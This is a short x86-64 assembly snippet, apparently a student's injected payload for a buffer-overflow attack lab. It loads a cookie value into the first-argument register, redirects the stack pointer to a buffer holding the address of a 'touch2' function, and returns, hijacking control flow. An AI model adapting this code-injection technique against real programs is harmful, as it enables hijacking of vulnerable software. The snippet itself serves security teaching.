    movl $0x59b997fa, %edi # load the %rdi, where 1st arg is, with cookie val
    movq $0x5561dc78, %rsp # load the %rsp with the beginning addr of the buf where the addr to touch2 is and will be returned to in the following
    retq
